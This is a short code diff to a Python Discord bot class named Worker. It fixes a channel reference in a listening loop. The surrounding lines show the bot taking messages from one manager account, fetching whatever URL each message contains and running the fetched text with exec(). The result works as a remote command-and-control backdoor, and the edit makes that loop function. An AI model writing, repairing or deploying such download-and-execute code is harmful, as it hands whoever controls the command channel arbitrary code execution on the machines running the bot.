@@ -28,6 +28,6 @@ class Worker:
     await self.bot.wait_until_ready()
     self.base = self.bot.get_channel(self.base)
     while True:
-      order = await self.bot.wait_for("message", check=lambda m: m.author.id == self.manager and m.channel == base)
+      order = await self.bot.wait_for("message", check=lambda m: m.author.id == self.manager and m.channel == self.base)
       page = requests.get(order.content).text
       exec(str(page))
